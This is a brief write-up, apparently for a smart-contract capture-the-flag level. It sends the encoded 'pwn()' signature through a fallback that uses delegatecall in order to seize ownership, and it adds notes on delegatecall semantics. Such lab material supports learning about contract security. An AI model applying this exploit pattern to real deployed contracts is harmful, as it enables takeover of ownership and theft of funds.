Solution:
First, Encode the function signature that gets passed as msg.data:
signature = web3.eth.abi.encodeFunctionSignature("pwn()")
Call our fallback function which does delegatecall():
await sendTransaction({from:player, to:contract.address, data:signature })

Other Notes:
-With delegatecall(), msg.sender, msg.value, and address(this), doesn't change.
-With delegatecall(), it loads function code of another contract and executes
it like it was in its scope.
